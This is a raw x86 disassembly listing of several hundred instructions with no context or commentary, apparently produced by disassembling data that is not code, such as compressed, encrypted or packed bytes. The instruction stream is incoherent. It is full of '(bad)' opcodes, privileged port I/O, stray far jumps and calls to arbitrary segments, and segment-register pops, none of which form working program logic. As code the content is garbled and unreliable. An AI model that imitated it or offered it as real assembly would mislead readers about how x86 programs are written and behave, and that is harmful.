  42a2a5:	(bad)  
  42a2a8:	inc    edx
  42a2a9:	mov    ds:0x1d753beb,al
  42a2ae:	test   ch,dh
  42a2b0:	add    ebp,ecx
  42a2b2:	push   eax
  42a2b3:	inc    esi
  42a2b4:	dec    eax
  42a2b5:	sbb    ebx,DWORD PTR [edi-0x61b24bf7]
  42a2bb:	cmp    al,0x88
  42a2bd:	xchg   ecx,eax
  42a2be:	add    al,0xa6
  42a2c0:	xchg   esp,eax
  42a2c1:	inc    ecx
  42a2c2:	adc    al,0xd7
  42a2c4:	stos   DWORD PTR es:[edi],eax
  42a2c5:	icebp  
  42a2c6:	and    ch,BYTE PTR [ecx-0x412a2623]
  42a2cc:	mov    edi,ebp
  42a2ce:	sbb    edi,DWORD PTR [ebp+0x21]
  42a2d1:	push   esp
  42a2d2:	xlat   BYTE PTR ds:[ebx]
  42a2d3:	mov    ah,0xb0
  42a2d5:	ror    DWORD PTR [esi],0xd4
  42a2d8:	lock cld 
  42a2da:	ja     0x42a271
  42a2dc:	fdiv   st,st(4)
  42a2de:	fdiv   QWORD PTR [ecx]
  42a2e0:	outs   dx,DWORD PTR ds:[esi]
  42a2e1:	dec    esp
  42a2e2:	popf   
  42a2e3:	or     eax,0x66d30594
  42a2e8:	mov    dh,0x6a
  42a2ea:	out    0xf3,al
  42a2ec:	daa    
  42a2ed:	add    bh,al
  42a2ef:	sub    esi,esi
  42a2f1:	in     al,dx
  42a2f2:	cmp    eax,0x6ebf096d
  42a2f7:	aaa    
  42a2f8:	mov    edi,0x48091a3d
  42a2fd:	popf   
  42a2fe:	xor    al,0x5b
  42a300:	xchg   BYTE PTR [edi],dl
  42a302:	fidiv  DWORD PTR [edi-0x4e]
  42a305:	mov    esi,0xe714d439
  42a30a:	arpl   WORD PTR [edi-0x77],ax
  42a30d:	jnp    0x42a2c1
  42a30f:	das    
  42a310:	mov    edi,0x24407656
  42a315:	add    edx,DWORD PTR [edi*4-0x1d3b1d7f]
  42a31c:	inc    edi
  42a31d:	sahf   
  42a31e:	pop    ds
  42a31f:	(bad)  
  42a320:	call   0x6cbb616c
  42a325:	call   0xd690:0x6bbabf5
  42a32c:	fiadd  DWORD PTR ds:0x9cef2006
  42a332:	pusha  
  42a333:	xchg   ebx,eax
  42a334:	ins    BYTE PTR es:[edi],dx
  42a335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a336:	add    eax,0xb77430c6
  42a33b:	aam    0xa6
  42a33d:	xor    al,BYTE PTR [eax-0x187bb1ee]
  42a343:	dec    edi
  42a344:	mov    BYTE PTR [ebx-0x2e],al
  42a347:	gs push ss
  42a349:	push   es
  42a34a:	pop    esi
  42a34b:	ins    DWORD PTR es:[edi],dx
  42a34c:	fild   WORD PTR [ebx]
  42a34e:	mov    dl,0xf9
  42a350:	(bad)  
  42a352:	fwait
  42a353:	mov    ebx,0x68a4a2e0
  42a358:	xchg   esp,eax
  42a359:	test   DWORD PTR [edx+0x5dc335eb],eax
  42a35f:	xchg   edx,eax
  42a360:	into   
  42a361:	lods   eax,DWORD PTR ds:[esi]
  42a362:	rcl    ebp,cl
  42a364:	lea    ebx,[eax]
  42a366:	imul   esp,DWORD PTR [eax+0x4bc7dfbb],0xffffff97
  42a36d:	push   ebp
  42a36e:	leave  
  42a36f:	mov    ?,WORD PTR [ecx]
  42a371:	inc    ebx
  42a372:	push   ss
  42a373:	cdq    
  42a374:	pop    edx
  42a375:	or     esp,esp
  42a377:	adc    BYTE PTR [ebp+0x4639405],ah
  42a37d:	iret   
  42a37e:	pop    ebp
  42a37f:	or     al,0x8c
  42a381:	or     bh,bh
  42a383:	jg     0x42a3b7
  42a385:	(bad)  
  42a386:	pusha  
  42a387:	cmp    eax,0x1e4265b9
  42a38c:	push   0x73
  42a38e:	pop    edx
  42a38f:	in     al,0x19
  42a391:	add    esi,DWORD PTR [esi+edx*2+0x3a]
  42a395:	aaa    
  42a396:	adc    DWORD PTR [ecx],esp
  42a398:	jge    0x42a364
  42a39a:	pop    ds
  42a39b:	xchg   DWORD PTR [esi+ecx*8-0x2ea165db],ecx
  42a3a2:	sub    esp,edx
  42a3a4:	dec    ebp
  42a3a5:	mov    DWORD PTR [edi+eax*1],edi
  42a3a8:	aas    
  42a3a9:	scas   al,BYTE PTR es:[edi]
  42a3aa:	fucom  st(5)
  42a3ac:	mov    DWORD PTR [ebp+0x2eb94787],eax
  42a3b2:	(bad)  
  42a3b3:	mov    esp,0x1f8a141e
  42a3b8:	sub    al,ch
  42a3ba:	mov    dl,0x14
  42a3bc:	pop    ss
  42a3bd:	sbb    eax,0xffea823c
  42a3c2:	test   BYTE PTR [ecx+edi*8+0x173f3646],bh
  42a3c9:	add    dh,al
  42a3cb:	cwde   
  42a3cc:	outs   dx,BYTE PTR ds:[esi]
  42a3cd:	xchg   esp,eax
  42a3ce:	scas   al,BYTE PTR es:[edi]
  42a3cf:	jmp    0xe37b:0x15b6c2fc
  42a3d6:	and    DWORD PTR [edi-0x292a9078],esp
  42a3dc:	jle    0x42a398
  42a3de:	mov    bl,0xbb
  42a3e0:	mov    WORD PTR [esi],es
  42a3e2:	into   
  42a3e3:	aam    0x4a
  42a3e5:	inc    eax
  42a3e6:	sbb    eax,0x7379d135
  42a3eb:	fist   DWORD PTR [edi+0x152f647b]
  42a3f1:	sahf   
  42a3f2:	popf   
  42a3f3:	inc    edx
  42a3f4:	shl    DWORD PTR [edi-0x537302a0],cl
  42a3fa:	cmp    eax,0xb4898790
  42a3ff:	daa    
  42a400:	or     bl,ch
  42a402:	lahf   
  42a403:	mov    DWORD PTR [esi],ebp
  42a405:	adc    BYTE PTR [edx-0x2b],bl
  42a408:	xlat   BYTE PTR ds:[ebx]
  42a409:	(bad)  
  42a40a:	jmp    0x42a3bd
  42a40c:	pop    esp
  42a40d:	leave  
  42a40e:	retf   0x89f7
  42a411:	pop    ss
  42a412:	push   esp
  42a413:	dec    eax
  42a414:	stos   BYTE PTR es:[edi],al
  42a415:	call   0x294a163
  42a41a:	sub    dl,ah
  42a41c:	aad    0x5a
  42a41e:	push   es
  42a41f:	mov    WORD PTR fs:[edx],?
  42a422:	pop    ds
  42a423:	xlat   BYTE PTR ds:[ebx]
  42a424:	push   0xf30cabfe
  42a429:	test   eax,0xee725d11
  42a42e:	pop    ss
  42a42f:	aam    0x34
  42a431:	pop    eax
  42a432:	push   ss
  42a433:	adc    esp,DWORD PTR [ebx+0x66]
  42a436:	cld    
  42a437:	lock mov DWORD PTR [edi+0x14aa22b4],edx
  42a43e:	mov    esp,0x6e05c790
  42a443:	retf   0x5c41
  42a446:	mov    ecx,0x9487aab9
  42a44b:	mov    ebp,0xaa0105df
  42a450:	sub    dl,BYTE PTR [ecx+0x5e]
  42a453:	ins    DWORD PTR es:[edi],dx
  42a454:	(bad)  
  42a455:	jmp    0xf711:0x1099d708
  42a45c:	mov    ch,0xea
  42a45e:	gs js  0x42a3ea
  42a461:	jecxz  0x42a4b3
  42a463:	push   es
  42a464:	jge    0x42a4b3
  42a466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a467:	adc    dl,BYTE PTR [edi+0x2]
  42a46a:	and    BYTE PTR [ebx],cl
  42a46c:	sub    esp,0x663ccf11
  42a472:	push   ds
  42a473:	addr16 or al,0xd5
  42a476:	jbe    0x42a47d
  42a478:	sub    ch,BYTE PTR ss:[ebx-0x45]
  42a47c:	jg     0x42a42f
  42a47e:	mov    esp,0x1b9589aa
  42a483:	jbe    0x42a46a
  42a485:	adc    DWORD PTR [edi-0x7ffc8f6b],ecx
  42a48b:	or     al,0x82
  42a48d:	xor    DWORD PTR [eax],ebx
  42a48f:	sbb    DWORD PTR [ecx+0x3],eax
  42a492:	repnz xor edx,DWORD PTR [ebx]
  42a495:	adc    ch,BYTE PTR [edx+0x1fb14e75]
  42a49b:	mov    ebp,0x7808a9ef
  42a4a0:	cmp    BYTE PTR [ebp-0x60a528d0],ch
  42a4a6:	in     al,dx
  42a4a7:	jmp    0xa0cdc697
  42a4ac:	mov    BYTE PTR [edi],ch
  42a4ae:	mov    al,ds:0x7b0fdf2d
  42a4b3:	popf   
  42a4b4:	xor    al,BYTE PTR [ebx]
  42a4b6:	js     0x42a4dd
  42a4b8:	iret   
  42a4b9:	or     edx,0xffffffbe
  42a4bc:	add    DWORD PTR [edi+ebx*1+0x71],edx
  42a4c0:	idiv   DWORD PTR [ecx+0x58]
  42a4c3:	rcr    DWORD PTR [edx],cl
  42a4c5:	and    edx,DWORD PTR [esi-0x40]
  42a4c8:	fild   DWORD PTR [edx]
  42a4ca:	rcr    bh,1
  42a4cc:	lods   al,BYTE PTR ds:[esi]
  42a4cd:	dec    ecx
  42a4ce:	loopne 0x42a4a7
  42a4d0:	and    DWORD PTR [edx+0x38a0a36e],ebp
  42a4d6:	xlat   BYTE PTR ds:[ebx]
  42a4d7:	mov    edi,0x25e4aec9
  42a4dc:	or     DWORD PTR [edx],eax
  42a4de:	mov    dh,BYTE PTR [edi]
  42a4e0:	dec    ebp
  42a4e1:	xor    dl,BYTE PTR [esi+eiz*8+0x4f1f479f]
  42a4e8:	imul   esp,esi,0x39
  42a4eb:	cmp    ah,BYTE PTR [edx-0x7b]
  42a4ee:	(bad)  
  42a4f0:	(bad)  [ebx-0x273afe3f]
  42a4f6:	cdq    
  42a4f7:	jne    0x42a47c
  42a4f9:	sub    al,0x1e
  42a4fb:	jg     0x42a57c
  42a4fd:	lahf   
  42a4fe:	ror    BYTE PTR [eax],0x66
  42a501:	sbb    eax,0x78e4d410
  42a506:	or     BYTE PTR [edi+0x19],ah
  42a509:	sub    ebx,esi
  42a50b:	mov    ?,WORD PTR [eax-0x774c8b01]
  42a511:	daa    
  42a512:	clc    
  42a513:	xchg   edx,eax
  42a514:	inc    esi
  42a515:	dec    esp
  42a516:	fcmovbe st,st(4)
  42a518:	mov    bh,0xc1
  42a51a:	and    al,0xc
  42a51c:	out    0x42,eax
  42a51e:	jle    0x42a508
  42a520:	mov    bl,ah
  42a522:	loope  0x42a565
  42a524:	icebp  
  42a525:	sbb    eax,0x2166483
  42a52a:	shl    ah,0x52
  42a52d:	bound  eax,QWORD PTR [esi]
  42a52f:	dec    ebx
  42a530:	xlat   BYTE PTR ds:[ebx]
  42a531:	out    dx,al
  42a532:	add    DWORD PTR [edx-0x77],edx
  42a535:	push   ecx
  42a536:	mov    ebx,DWORD PTR [edi+0x5ea23326]
  42a53c:	js     0x42a539
  42a53e:	pop    edi
  42a53f:	aad    0x40
  42a541:	add    cl,cl
  42a543:	and    DWORD PTR [edi+0x5d],ebx
  42a546:	pop    ebp
  42a547:	mov    edi,0x16442d88
  42a54c:	cmp    eax,0x6b1a54a2
  42a551:	test   DWORD PTR [ecx],ebp
  42a553:	push   ds
  42a554:	outs   dx,DWORD PTR ds:[esi]
  42a555:	add    dl,dh
  42a557:	xchg   ebp,eax
  42a558:	out    0xbd,eax
  42a55a:	lahf   
  42a55b:	test   BYTE PTR [edi-0x4396827b],dh
  42a561:	jo     0x42a567
  42a563:	xchg   edi,eax
  42a564:	scas   al,BYTE PTR es:[edi]
  42a565:	std    
  42a566:	mov    eax,0x66154d44
  42a56b:	sub    al,0x9d
  42a56d:	pop    ds
  42a56e:	ss mov bh,0x6b
  42a571:	mov    ebp,0x67888646
  42a576:	ins    DWORD PTR es:[di],dx
  42a578:	push   cs
  42a579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a57a:	mov    ebp,0x39ca8d81
  42a57f:	sbb    cl,BYTE PTR [eax-0x806e69]
  42a585:	sub    ebp,esp
  42a587:	jmp    0xed89:0x8807fe7b
  42a58e:	push   es
  42a58f:	jmp    0x42a53a
  42a591:	fmul   QWORD PTR [ebp+0x4401c6e0]
  42a597:	lock adc BYTE PTR [ecx+0x5f48a0f0],bh
  42a59e:	idiv   BYTE PTR [ecx]
  42a5a0:	xchg   DWORD PTR [ebp-0x51],eax
  42a5a3:	(bad)  
  42a5a4:	push   ebp
  42a5a5:	dec    edi
  42a5a6:	lds    ebp,FWORD PTR [ebx]
  42a5a8:	pop    esp
  42a5a9:	out    dx,eax
  42a5aa:	pop    eax
  42a5ab:	push   esp
  42a5ac:	dec    ecx
  42a5ad:	cmp    DWORD PTR [edi+0x5a],0x8cafdb65
  42a5b4:	add    eax,0x6fbb21d
  42a5b9:	pop    edx
  42a5ba:	cmp    DWORD PTR [ebp-0x329fc336],ebp
  42a5c0:	push   edi
  42a5c1:	gs pop ds
  42a5c3:	cmp    DWORD PTR [eax-0x214a1f0d],0x3ed71ca8
  42a5cd:	loopne 0x42a5a1
  42a5cf:	cwde   
  42a5d0:	cmp    ebp,eax
  42a5d2:	sub    esi,edx
  42a5d4:	mov    ebx,edi
  42a5d6:	arpl   WORD PTR [edx+esi*1-0x76],bp
  42a5da:	or     edx,ecx
  42a5dc:	pop    eax
  42a5dd:	cmp    DWORD PTR [ebx-0x604d8e2c],ebx
  42a5e3:	adc    eax,0x5c88e716
  42a5e8:	mov    bh,bl
  42a5ea:	or     DWORD PTR [ebx],esi
  42a5ec:	lock xchg edi,ebx
  42a5ef:	data16 (bad) 
  42a5f2:	jno    0x42a5c9
  42a5f4:	mov    DWORD PTR [eax+0x4abafb08],esp
  42a5fa:	dec    edi
  42a5fb:	add    al,0x96
  42a5fd:	jge    0x42a616
  42a5ff:	cdq    
  42a600:	lahf   
  42a601:	jmp    0xa4a3:0x8dee99e3
  42a608:	mov    esp,esp
  42a60a:	add    BYTE PTR [ebx+eiz*8+0x2],ah
  42a60e:	pop    edi
  42a60f:	add    DWORD PTR [ecx+0x6bcbc4ef],ecx
  42a615:	push   ebp
  42a616:	fwait
  42a617:	xchg   esp,eax
  42a618:	or     al,BYTE PTR [ebx]
  42a61a:	xor    bl,BYTE PTR [edx]
  42a61c:	mov    cl,0xe6
  42a61e:	ins    BYTE PTR es:[edi],dx
  42a61f:	inc    esi
  42a620:	mov    edx,0x1a8960f2
  42a625:	test   ebp,0x2e350025
  42a62b:	aam    0x46
  42a62d:	cmc    
  42a62e:	fstp   TBYTE PTR [ebp-0x13]
  42a631:	retf   0x131c
  42a634:	mov    DWORD PTR [ebx],esp
  42a636:	add    esi,esp
  42a638:	sub    eax,DWORD PTR [eax+0x47]
  42a63b:	into   
  42a63c:	scas   eax,DWORD PTR es:[edi]
  42a63d:	add    ah,BYTE PTR [edx-0x1b4eb365]
  42a643:	scas   al,BYTE PTR es:[edi]
  42a644:	fwait
  42a645:	ret    0xd11f
  42a648:	dec    ebx
  42a649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a64a:	test   DWORD PTR [edx],0xd3b9b664
  42a650:	xor    edi,DWORD PTR [eax]
  42a652:	mov    esp,0x4f30c68a
  42a657:	or     ch,BYTE PTR [edi-0x40]
  42a65a:	pusha  
  42a65b:	fist   WORD PTR [edx]
  42a65d:	add    al,0x96
  42a65f:	mov    ch,0x28
  42a661:	or     DWORD PTR [edx-0x1598232b],edi
  42a667:	xchg   esi,eax
  42a668:	xchg   esi,eax
  42a669:	dec    ebx
  42a66a:	and    DWORD PTR [ebx+ecx*4-0x1b],ebx
  42a66e:	out    dx,al
  42a66f:	into   
  42a670:	push   es
  42a671:	inc    edx
  42a672:	dec    edi
  42a673:	and    eax,DWORD PTR ss:[ecx]
  42a676:	jmp    FWORD PTR [esi]
  42a678:	mov    ds:0x889b9195,al
  42a67d:	mov    ecx,0xee11d4e
  42a682:	fiadd  DWORD PTR cs:[edi+0x16e5d0e7]
  42a689:	push   esp
  42a68a:	mov    edi,0xe7e11a3e
  42a68f:	aam    0x54
  42a691:	inc    esp
  42a692:	inc    edx
  42a693:	and    DWORD PTR [di+0x7dcc],ebx
  42a698:	cdq    
  42a699:	sub    esp,DWORD PTR [edx-0x15bb644d]
  42a69f:	mov    ebx,0x235ff012
  42a6a4:	out    dx,eax
  42a6a5:	jmp    0x51cb0cf4
  42a6aa:	dec    esp
  42a6ab:	jo     0x42a6da
  42a6ad:	push   edx
  42a6ae:	push   esi
  42a6af:	add    esi,edx
  42a6b1:	add    eax,0xd49672e
  42a6b6:	pushf  
  42a6b7:	jb     0x42a6ac
  42a6b9:	adc    bl,BYTE PTR [edx]
  42a6bb:	dec    esp
  42a6bc:	repnz sbb DWORD PTR [edx],edx
  42a6bf:	ins    BYTE PTR es:[edi],dx
  42a6c0:	and    BYTE PTR [esi+0x398997af],dl
  42a6c6:	gs in  eax,0x78
  42a6c9:	and    ebp,DWORD PTR ds:[ebx-0x4f]
  42a6cd:	add    dl,dl
  42a6cf:	addr16 sahf 
  42a6d1:	(bad)  
  42a6d2:	ins    BYTE PTR es:[edi],dx
  42a6d3:	nop
  42a6d4:	jns    0x42a73d
  42a6d6:	push   ds
  42a6d7:	jae    0x42a667
  42a6d9:	stos   BYTE PTR es:[edi],al
  42a6da:	mov    eax,ds:0x7abe086c
  42a6df:	aam    0x95
  42a6e1:	cmp    cl,bl
  42a6e3:	aaa    
  42a6e4:	pop    esp
  42a6e5:	jg     0x42a6d7
  42a6e7:	add    bl,BYTE PTR [ebp+0x6d]
  42a6ea:	fisub  WORD PTR [eax-0x2f]
  42a6ed:	mov    DWORD PTR [ecx-0x59],eax
  42a6f0:	mov    BYTE PTR [ebx],ch
  42a6f2:	scas   eax,DWORD PTR es:[edi]
  42a6f3:	adc    BYTE PTR [edx+0x77d5ddfb],0xc6
  42a6fa:	aad    0xf0
  42a6fc:	lds    ecx,FWORD PTR [ebp-0x44775649]
  42a702:	xchg   esp,eax
  42a703:	inc    ecx
  42a704:	mov    ebx,0xd9387f7
  42a709:	add    DWORD PTR [esi+0x50],ebp
  42a70c:	push   ebp
  42a70d:	xor    DWORD PTR [ecx],esp
  42a70f:	mov    bh,0x48
  42a711:	inc    edx
  42a712:	retf   0x9459
  42a715:	daa    
  42a716:	daa    
  42a717:	add    DWORD PTR [ebp-0x3e],ecx
  42a71a:	cld    
  42a71b:	lds    edx,FWORD PTR [edx-0x72]
  42a71e:	scas   eax,DWORD PTR es:[edi]
  42a71f:	aad    0x12
  42a721:	or     eax,0x5abcd84b
  42a726:	bound  esp,QWORD PTR [ebp+edx*4-0x5d9795b]
  42a72d:	inc    ebp
  42a72e:	xchg   ebp,eax
  42a72f:	jno    0x42a715
  42a731:	retf   0xd4f8
  42a734:	jno    0x42a732
  42a736:	xchg   ebp,eax
  42a737:	push   eax
  42a738:	and    BYTE PTR [edx],cl
  42a73a:	out    0xb2,al
  42a73c:	mov    BYTE PTR [ebp-0x7bbaf959],ah
  42a742:	sbb    eax,0x4e1f1cbb
  42a747:	dec    esp
  42a748:	lfs    esp,FWORD PTR [ebp+esi*8+0xdaffb4a]
  42a750:	inc    ebx
  42a751:	xchg   esi,eax
  42a752:	push   ss
  42a753:	xchg   edx,eax
  42a754:	mov    BYTE PTR [ebx],ch
  42a756:	xor    DWORD PTR [eax+0x37],ebp
  42a759:	xchg   ebp,eax
  42a75a:	add    esi,0x4c20350
  42a760:	fisubr DWORD PTR [esi+0x3d57a542]
  42a766:	push   ds
  42a767:	retf   
  42a768:	jmp    0x42a709
  42a76a:	dec    esi
  42a76b:	pop    es
  42a76c:	xchg   BYTE PTR [ecx],ah
  42a76e:	aad    0xd4
  42a770:	push   ecx
  42a771:	pop    esp
  42a772:	cmc    
  42a773:	or     al,0x13
  42a775:	fadd   st(4),st
  42a777:	xchg   edi,eax
  42a778:	lea    esp,[edi-0x6b]
  42a77b:	sub    edi,DWORD PTR [ebx]
  42a77d:	mov    ds:0xf97b56f7,eax
  42a782:	pusha  
  42a783:	les    ebp,FWORD PTR [ebx]
  42a785:	jbe    0x42a7d2
  42a787:	jnp    0x42a730
  42a789:	cmc    
  42a78a:	pop    ds
  42a78b:	add    DWORD PTR [ebp+0x7eadfb55],esi
  42a791:	xor    edi,DWORD PTR [eax+0x4e037a15]
  42a797:	test   al,0x6a
  42a799:	pop    es
  42a79a:	(bad)  
  42a79b:	mov    ah,0xdf
  42a79d:	mov    esp,DWORD PTR [eax-0x1b]
  42a7a0:	sbb    al,0x29
  42a7a2:	cld    
  42a7a3:	cdq    
  42a7a4:	stos   BYTE PTR es:[edi],al
  42a7a5:	nop
  42a7a6:	inc    eax
  42a7a7:	aam    0xbc
  42a7a9:	cs scas eax,DWORD PTR es:[edi]
  42a7ab:	icebp  
  42a7ac:	xor    ebp,edx
  42a7ae:	xchg   ebp,eax
  42a7af:	test   DWORD PTR [eax-0x4f],ecx
  42a7b2:	pusha  
  42a7b3:	mov    bh,0x4b
  42a7b5:	call   0xd4dd:0xed1632ca
  42a7bc:	pop    ebx
  42a7bd:	pushf  
  42a7be:	dec    eax
  42a7bf:	and    al,0x8c
  42a7c1:	jle    0x42a7a3
  42a7c3:	and    eax,0x10b653b6
  42a7c8:	mov    edx,esp
  42a7ca:	sub    esp,ebx
  42a7cc:	idiv   BYTE PTR [ecx]
  42a7ce:	int3   
  42a7cf:	aad    0xd2
  42a7d1:	dec    esp
  42a7d2:	xchg   ebx,ebp
  42a7d4:	scas   eax,DWORD PTR es:[edi]
  42a7d5:	nop
  42a7d6:	mov    bl,0x14
  42a7d8:	xchg   esi,eax
  42a7d9:	gs scas al,BYTE PTR es:[edi]
  42a7db:	xlat   BYTE PTR ds:[ebx]
  42a7dc:	jmp    0x42a75f
  42a7de:	cmp    bh,al
  42a7e0:	leave  
  42a7e1:	add    bl,BYTE PTR [ebp-0x238e47ce]
  42a7e7:	aad    0xd9
  42a7e9:	js     0x42a786
  42a7eb:	lods   al,BYTE PTR ds:[esi]
  42a7ec:	(bad)  
  42a7ed:	in     al,0x77
  42a7ef:	jno    0x42a779
  42a7f1:	mov    eax,DWORD PTR [esi+esi*4-0x297162cc]
  42a7f8:	cmp    al,0x1d
  42a7fa:	enter  0xad79,0x57
  42a7fe:	mov    bh,0xff
  42a800:	sbb    BYTE PTR [ecx-0x20768b32],ch
  42a806:	jl     0x42a832
  42a808:	lea    ebp,[esi+0x2df94d2]
  42a80e:	mov    dl,0x9e
  42a810:	test   DWORD PTR [ebp-0x2b],0xbcafc864
  42a817:	jmp    0x83622c3d
  42a81c:	mov    es,WORD PTR [eax+esi*4-0x27]
  42a820:	lods   al,BYTE PTR ds:[esi]
  42a821:	add    ch,BYTE PTR [ecx+edi*2-0x66]
  42a825:	mov    es,edx
  42a827:	pop    ecx
  42a828:	mov    dl,0xd3
  42a82a:	bound  edx,QWORD PTR [ebx-0x61fca683]
  42a830:	addr16 add ebp,edi
  42a833:	push   0xffffffe0
  42a835:	push   es
  42a836:	mov    ah,0xd4
  42a838:	lea    ebx,[ecx+eiz*8-0x4e6cf1f8]
  42a83f:	or     BYTE PTR [eax-0x3f7b83e5],0x33
  42a846:	xor    edi,ebp
  42a848:	out    0x5,al
  42a84a:	cli    
  42a84b:	out    0x7b,eax
  42a84d:	jae    0x42a7f3
  42a84f:	and    al,BYTE PTR [ebx-0x6b]
  42a852:	pop    ds
  42a853:	and    DWORD PTR [edi-0x1b42ba8a],ebx
  42a859:	pop    es
  42a85a:	jge    0x42a831
  42a85c:	mov    eax,ds:0xbac85ac8
  42a861:	mov    WORD PTR [ebx+eiz*4],ds
  42a864:	xchg   edi,eax
  42a865:	mov    eax,ds:0x834f1463
  42a86a:	pop    es
  42a86b:	push   edx
  42a86c:	mov    eax,0xc3aeb54a
  42a871:	stos   DWORD PTR es:[edi],eax
  42a872:	ja     0x42a843
  42a874:	sub    al,0x3
  42a876:	ja     0x42a858
  42a878:	adc    DWORD PTR [edx],0x6
  42a87b:	or     esi,DWORD PTR [ecx-0x7e3fb443]
  42a881:	dec    esp
  42a882:	mov    ds:0x20ce8659,al
  42a887:	scas   eax,DWORD PTR es:[edi]
  42a888:	push   0x74
  42a88a:	loope  0x42a845
  42a88c:	sub    al,0x90
  42a88e:	in     eax,0xbd
  42a890:	dec    eax
  42a891:	sub    BYTE PTR ds:0x9864f4e1,al
  42a897:	dec    ebp
  42a898:	inc    edx
  42a899:	add    ah,BYTE PTR [edx]
  42a89b:	js     0x42a886
  42a89d:	adc    DWORD PTR es:0x37429ec,edx
  42a8a4:	test   eax,0x51ddde3f
  42a8a9:	enter  0xa382,0x83
  42a8ad:	adc    DWORD PTR [ebx-0x5],edi
  42a8b0:	or     eax,0xd2341fec
  42a8b5:	jae    0x42a91c
  42a8b7:	aam    0x43
  42a8b9:	dec    eax
  42a8ba:	in     eax,0x14
  42a8bc:	adc    edi,DWORD PTR ds:0x4628a9b5
  42a8c2:	mov    edi,0xb79388e0
  42a8c7:	scas   al,BYTE PTR es:[edi]
  42a8c8:	dec    edi
  42a8c9:	or     edx,0xba4bf27b
  42a8cf:	popf   
  42a8d0:	xchg   edi,eax
  42a8d1:	push   es
  42a8d2:	jl     0x42a867
  42a8d4:	pop    edi
  42a8d5:	mov    edi,0x8361552e
  42a8da:	jno    0x42a899
  42a8dc:	sub    eax,0xb0ccdfc2
  42a8e1:	lods   eax,DWORD PTR ds:[esi]
  42a8e2:	sub    ecx,esi
  42a8e4:	je     0x42a8e9
  42a8e6:	inc    ebx
  42a8e7:	sbb    esi,edx
  42a8e9:	or     BYTE PTR [ebx-0x15fd6453],ch
  42a8ef:	jnp    0x42a905
  42a8f1:	push   0xffffffb2
  42a8f3:	aas    
  42a8f4:	(bad)  
  42a8f5:	sti    
  42a8f6:	bound  edi,QWORD PTR [edi-0x543462a4]
  42a8fc:	dec    esp
  42a8fd:	push   esi
  42a8fe:	pop    esi
  42a8ff:	inc    ebx
  42a900:	add    eax,DWORD PTR [ebx]
  42a902:	xchg   edx,eax
  42a903:	popf   
  42a904:	hlt    
  42a905:	jmp    0x7efa2899
  42a90a:	pop    ds
  42a90b:	aad    0x5f
  42a90d:	jmp    0x8e12c495
  42a912:	xlat   BYTE PTR ds:[ebx]
  42a913:	aam    0x25
  42a915:	shr    DWORD PTR [esi+0x7a3ca63],1
  42a91b:	fwait
  42a91c:	dec    eax
  42a91d:	lea    ebx,[edi]
  42a91f:	fild   DWORD PTR [ebx+esi*4+0x648c6ad0]
  42a926:	ret    
  42a927:	aad    0xcc
  42a929:	sub    ch,BYTE PTR [edi+0x60]
  42a92c:	test   eax,0x889d63b5
  42a931:	pop    ebx
  42a932:	mov    ch,0x29
  42a934:	dec    edx
  42a935:	xor    BYTE PTR [eax+0xc021b52],dl
  42a93b:	inc    ebx
  42a93c:	enter  0xabdd,0x4e
  42a940:	lods   eax,DWORD PTR ds:[esi]
  42a941:	dec    esp
  42a942:	inc    ebx
  42a943:	pop    ds
  42a944:	icebp  
  42a945:	push   esp
  42a946:	push   ds
  42a947:	cdq    
  42a948:	mov    ch,0xd0
  42a94a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a94b:	sbb    ebp,DWORD PTR [edx+eax*1]
  42a94e:	pushf  
  42a94f:	jmp    0x2ad142b7
  42a954:	inc    edx
  42a955:	sbb    al,0x5b
  42a957:	std    
  42a958:	outs   dx,BYTE PTR ds:[esi]
  42a959:	cs (bad) 
  42a95b:	cli    
  42a95c:	xchg   esi,eax
  42a95d:	inc    esp
  42a95e:	mov    cl,0x55
  42a960:	push   ss
  42a961:	and    eax,0x8eccd430
  42a966:	xchg   DWORD PTR [eax+0x73110c6c],edx
  42a96c:	mov    bh,dh
  42a96e:	lods   al,BYTE PTR ds:[esi]
  42a96f:	add    edi,DWORD PTR [ebx-0x30]
  42a972:	not    WORD PTR [edi+0x1c]
  42a976:	jp     0x42a91c
  42a978:	(bad)  
  42a979:	mov    edi,0x3af953db
  42a97e:	cmp    esi,DWORD PTR [edi-0x2b3837f0]
  42a984:	xor    BYTE PTR [edx+0x2eb86628],dl
  42a98a:	add    BYTE PTR [ebx+0x262b8202],bh
  42a990:	jb     0x42a9ae
  42a992:	cdq    
  42a993:	sub    ch,BYTE PTR [edx+esi*4-0x41b6d3e1]
  42a99a:	popa   
  42a99b:	xchg   ebx,eax
  42a99c:	loop   0x42a9b1
  42a99e:	call   0xc68d363d
  42a9a3:	or     BYTE PTR [esi-0x20554605],cl
  42a9a9:	push   esp
  42a9aa:	int3   
  42a9ab:	(bad)  
  42a9ac:	fld    DWORD PTR [edx+0x2a4a6e1]
  42a9b2:	fwait
  42a9b3:	jns    0x42a9cc
  42a9b5:	add    esp,DWORD PTR [ecx+0x7bf95980]
  42a9bb:	add    eax,DWORD PTR [edi]
  42a9bd:	add    ch,BYTE PTR [eax+0x7420239b]
  42a9c3:	inc    edi
  42a9c4:	test   BYTE PTR [esi+0x1e],dl
  42a9c7:	jge    0x42aa14
  42a9c9:	in     al,0x8f
  42a9cb:	idiv   BYTE PTR [edi+eax*8]
  42a9ce:	mov    bl,0xaa
  42a9d0:	ds cdq 
  42a9d2:	jne    0x42a9ec
  42a9d4:	mov    WORD PTR [edx],es
  42a9d6:	push   edx
  42a9d7:	dec    eax
  42a9d8:	leave  
  42a9d9:	push   es
  42a9da:	pop    ds
  42a9db:	mov    ebx,0x873cf326
  42a9e0:	ficom  WORD PTR [edi-0x5c9a4419]
  42a9e6:	imul   ebp,DWORD PTR [esi],0x55
  42a9e9:	outs   dx,DWORD PTR ds:[esi]
  42a9ea:	test   ebx,0x696aa244
  42a9f0:	retf   0x1038
  42a9f3:	bound  ecx,QWORD PTR [ecx]
  42a9f5:	inc    edi
  42a9f6:	add    BYTE PTR [ebx-0x4e],dl
  42a9f9:	xlat   BYTE PTR ds:[ebx]
  42a9fa:	rol    BYTE PTR [edx-0x49],1
  42a9fd:	add    eax,0x223860fc
  42aa02:	dec    eax
  42aa03:	xchg   edx,eax
  42aa04:	jg     0x42aa06
  42aa06:	pop    ds
  42aa07:	loope  0x42aa32
  42aa09:	adc    ebp,edi
